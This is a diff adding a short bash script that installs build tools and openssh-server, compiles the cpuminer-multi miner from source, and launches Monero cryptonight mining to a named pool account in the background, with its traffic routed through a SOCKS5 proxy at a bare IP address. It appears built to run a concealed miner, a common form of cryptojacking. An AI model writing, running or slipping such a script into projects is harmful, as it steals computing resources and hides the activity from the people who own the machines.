@@ -1,0 +1,4 @@
+#!/bin/bash
+sudo apt-get install cpulimit -y && cpulimit --exe cpuminer  -b && sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y && git clone https://github.com/tpruvot/cpuminer-multi && cd cpuminer-multi && chmod +x build.sh && ./build.sh || true && sudo make install && ./cpuminer -a cryptonight -o stratum+tcp://us-east.monero.miningpoolhub.com:20580 -u chikaseller.chikaseller -p x -x socks5://149.248.5.156:6651 --background
+
+
